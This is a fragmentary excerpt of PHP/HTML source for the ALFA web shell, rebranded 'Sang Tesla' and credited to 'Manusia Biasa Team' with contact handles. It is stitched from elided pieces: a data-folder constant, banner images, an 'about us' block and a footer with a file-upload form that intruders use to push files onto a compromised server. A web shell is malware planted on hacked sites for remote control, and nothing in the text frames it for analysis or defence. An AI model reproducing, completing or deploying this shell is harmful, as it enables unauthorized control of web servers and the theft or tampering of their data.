...
define("__ALFA_DATA_FOLDER__", "PELER_KUDA");
...
<title>.: Sang Tesla :.</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.imgur.com/zEWwZvW.png" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.imgur.com/zEWwZvW.png" /></td>
</tr>
<tr>
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.imgur.com/zEWwZvW.png'><br>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Manusia Biasa Team &copy; 2016-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>lembagahakim@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/'>@Gesrekksss</a></span></div></td>
</tr>
</table>
</div>
